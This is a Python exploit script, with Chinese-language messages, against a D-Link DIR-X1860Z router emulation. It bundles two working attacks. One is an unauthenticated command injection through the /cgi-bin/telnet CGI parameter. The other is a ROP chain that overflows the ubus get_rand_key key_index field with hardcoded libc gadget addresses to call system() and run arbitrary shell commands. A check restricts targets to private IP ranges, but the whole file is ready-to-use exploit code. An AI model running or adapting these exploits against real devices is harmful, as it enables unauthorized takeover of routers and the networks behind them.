#!/usr/bin/env python3
import argparse
import http.client
import ipaddress
import json
import re
import secrets
import struct
import sys
import time

DEFAULT_HOST = "192.168.135.137"
DEFAULT_PORT = 23355
ZERO_SID = "00000000000000000000000000000000"
LIBC_BASE = 0x3F6B7000
POP_R3_PC = LIBC_BASE + 0x2BBE0
MOV_R0_SP_BLX_R3 = LIBC_BASE + 0xF5784
SYSTEM_PLT = 0x1260C
COMMAND_OFFSET = 132
ALLOWED_NETWORKS = (
    ipaddress.ip_network("10.0.0.0/8"),
    ipaddress.ip_network("172.16.0.0/12"),
    ipaddress.ip_network("192.168.0.0/16"),
    ipaddress.ip_network("127.0.0.0/8"),
)


def local_ip(value):
    try:
        address = ipaddress.ip_address(value)
    except ValueError as exc:
        raise argparse.ArgumentTypeError("目标必须是 IP 地址") from exc
    if not any(address in network for network in ALLOWED_NETWORKS):
        raise argparse.ArgumentTypeError("仅允许本地授权网段目标")
    return str(address)


def request(host, port, method, path, body=None, timeout=15):
    connection = http.client.HTTPConnection(host, port, timeout=timeout)
    try:
        headers = {"Content-Type": "application/json"} if body is not None else {}
        connection.request(method, path, body=body, headers=headers)
        response = connection.getresponse()
        return response.status, response.read().decode("utf-8", "replace")
    finally:
        connection.close()


def preflight(host, port, timeout):
    status, _ = request(host, port, "GET", "/login.html", timeout=timeout)
    if status != 200:
        raise RuntimeError(f"Web 前端异常：login.html 返回 HTTP {status}")
    body = json.dumps({
        "jsonrpc": "2.0", "id": 1, "method": "call",
        "params": [ZERO_SID, "routerd", "param_status", {}],
    })
    status, response = request(host, port, "POST", "/ubus", body=body, timeout=timeout)
    if status != 200 or "jsonrpc" not in response:
        raise RuntimeError(f"ubus 后端异常：HTTP {status}，{response[:200]}")
    print(f"[+] Web 前后端可达：http://{host}:{port}/")


def shell_path(command):
    if not command or any(ord(char) < 32 or ord(char) > 126 for char in command):
        raise ValueError("命令必须是非空 ASCII 可打印字符串")
    return re.sub(r"\s+", "${IFS}", command)


def proof_command(command, proof_path, token):
    return f"{command}>{proof_path};echo {token}>>{proof_path}"


def fetch_proof(host, port, proof_name, token, timeout):
    last_error = "未取回验证文件"
    for _ in range(6):
        try:
            status, body = request(
                host, port, "GET", "/" + proof_name, timeout=timeout
            )
            if status == 200 and token in body:
                return body.strip()
            last_error = f"HTTP {status}，响应不含本次随机标记"
        except (OSError, http.client.HTTPException) as exc:
            last_error = repr(exc)
        time.sleep(0.5)
    raise RuntimeError(last_error)


def exploit_cgi(host, port, command, token, timeout):
    if "&" in command:
        raise ValueError("CGI 模式不支持命令中的 &，请使用分号连接命令")
    proof_name = f"dirx_cgi_{token}.txt"
    proof_path = "/www/" + proof_name
    payload = proof_command(command, proof_path, token)
    path = (
        "/cgi-bin/telnet?x=';" + shell_path(payload) + ";echo${IFS}'"
        "&user=a&pwd=b&enable=false"
    )
    print(f"[*] DIRX-01：发送 CGI eval 注入，执行 {command!r}")
    try:
        status, body = request(host, port, "GET", path, timeout=timeout)
        print(f"[*] 触发响应：HTTP {status} {body[:160].strip()}")
    except (OSError, http.client.HTTPException) as exc:
        print(f"[*] 触发连接结束：{exc!r}；继续独立取回执行结果")
    output = fetch_proof(host, port, proof_name, token, timeout)
    print("[+] DIRX-01 VALIDATED：未授权命令执行成功")
    print(output)
    return True


def exploit_rop(host, port, command, token, timeout):
    proof_name = f"dirx_rop_{token}.txt"
    proof_path = "/www/" + proof_name
    command_bytes = proof_command(command, proof_path, token).encode("ascii") + b"\x00"
    available = 512 - COMMAND_OFFSET
    if len(command_bytes) > available:
        raise ValueError(f"ROP 命令连同验证参数过长：{len(command_bytes)} > {available} 字节")

    payload = bytearray(b"A" * 512)
    payload[120:124] = struct.pack("<I", POP_R3_PC)
    payload[124:128] = struct.pack("<I", SYSTEM_PLT)
    payload[128:132] = struct.pack("<I", MOV_R0_SP_BLX_R3)
    payload[COMMAND_OFFSET:COMMAND_OFFSET + len(command_bytes)] = command_bytes
    body = json.dumps({
        "jsonrpc": "2.0", "id": 1, "method": "call",
        "params": [ZERO_SID, "routerd", "get_rand_key", {
            "key_index": payload.hex(),
        }],
    })
    print(f"[*] DIRX-02：发送 key_index 栈溢出 ROP，执行 {command!r}")
    try:
        status, response = request(host, port, "POST", "/ubus", body=body, timeout=timeout)
        print(f"[*] 触发响应：HTTP {status} {response[:200].strip()}")
    except (OSError, http.client.HTTPException) as exc:
        print(f"[*] 触发连接结束：{exc!r}；继续独立取回执行结果")
    output = fetch_proof(host, port, proof_name, token, timeout)
    print("[+] DIRX-02 VALIDATED：仿真地址版 ROP 命令执行成功")
    print(output)
    return True


def main():
    parser = argparse.ArgumentParser(
        description="DIR-X1860Z 本地授权仿真一键 EXP：CGI 注入 + get_rand_key ROP"
    )
    parser.add_argument("--host", type=local_ip, default=DEFAULT_HOST)
    parser.add_argument("--port", type=int, default=DEFAULT_PORT)
    parser.add_argument("--only", choices=("all", "cgi", "rop"), default="all")
    parser.add_argument("--command", default="id", help="要执行的 shell 命令，默认 id")
    parser.add_argument("--timeout", type=float, default=15)
    args = parser.parse_args()
    if not 1 <= args.port <= 65535:
        parser.error("端口必须在 1-65535 之间")
    if args.timeout <= 0:
        parser.error("超时时间必须大于 0")

    exploits = []
    if args.only in ("all", "cgi"):
        exploits.append(("DIRX-01", exploit_cgi))
    if args.only in ("all", "rop"):
        exploits.append(("DIRX-02", exploit_rop))

    failures = []
    try:
        preflight(args.host, args.port, args.timeout)
        for name, exploit in exploits:
            token = secrets.token_hex(8)
            try:
                exploit(args.host, args.port, args.command, token, args.timeout)
            except (OSError, ValueError, RuntimeError, http.client.HTTPException) as exc:
                failures.append(name)
                print(f"[-] {name} 失败：{exc}", file=sys.stderr)
    except (OSError, RuntimeError, http.client.HTTPException) as exc:
        print(f"[-] 预检失败：{exc}", file=sys.stderr)
        return 2

    if failures:
        print(f"[-] 未完成：{', '.join(failures)}", file=sys.stderr)
        return 1
    print("[+] 所选漏洞均已完成端到端验证")
    return 0


if __name__ == "__main__":
    sys.exit(main())
